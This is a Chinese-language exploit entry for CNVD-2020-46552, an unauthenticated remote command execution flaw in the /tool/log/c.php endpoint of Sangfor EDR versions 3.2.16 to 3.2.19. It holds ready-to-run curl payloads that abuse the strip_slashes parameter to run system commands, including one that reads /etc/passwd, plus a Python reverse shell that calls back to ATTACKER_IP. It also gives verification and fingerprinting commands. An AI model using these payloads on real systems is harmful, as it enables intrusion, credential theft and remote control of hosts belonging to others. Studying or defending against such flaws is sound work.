---
id: SANGFOR-EDR-RCE
title: 深信服 EDR c.php 远程命令执行漏洞 (CNVD-2020-46552)
product: sangfor
vendor: 深信服
version_affected: "EDR 3.2.16, 3.2.17, 3.2.19"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["深信服", "Sangfor", "EDR", "终端检测"]
---

## 漏洞描述

深信服 EDR（终端检测响应平台）的 `/tool/log/c.php` 接口存在远程命令执行漏洞。该接口的 `strip_slashes` 参数可设置为 `system` 等 PHP 函数名，配合 `host`/`limit`/`path`/`row` 等参数传入命令内容，实现无需认证的远程代码执行。

## 影响版本

- 深信服 EDR 3.2.16
- 深信服 EDR 3.2.17
- 深信服 EDR 3.2.19

## 前置条件

- 无需认证
- EDR 管理端口可访问

## 利用步骤

1. 直接访问 `/tool/log/c.php` 接口
2. 设置 `strip_slashes=system` 将 PHP system 函数作为回调
3. 通过 `host` 参数传入要执行的命令

## Payload

### GET 方式执行命令

```bash
curl -sk "https://target/tool/log/c.php?strip_slashes=system&host=id"
curl -sk "https://target/tool/log/c.php?strip_slashes=system&host=whoami"
curl -sk "https://target/tool/log/c.php?strip_slashes=system&host=cat+/etc/passwd"
```

### 其他可用参数

```bash
curl -sk "https://target/tool/log/c.php?strip_slashes=system&limit=id"
curl -sk "https://target/tool/log/c.php?strip_slashes=system&path=id"
curl -sk "https://target/tool/log/c.php?strip_slashes=system&row=id"
```

### 反弹 Shell

```bash
curl -sk "https://target/tool/log/c.php" \
  -d "strip_slashes=system&host=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

## 验证方法

```bash
curl -sk "https://target/tool/log/c.php?strip_slashes=system&host=id" | grep "uid="
```

## 指纹确认

```bash
curl -sk "https://target/" | grep -i "EDR\|Sangfor\|深信服"
curl -sk "https://target/tool/log/c.php" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://www.cnvd.org.cn/flaw/show/CNVD-2020-46552
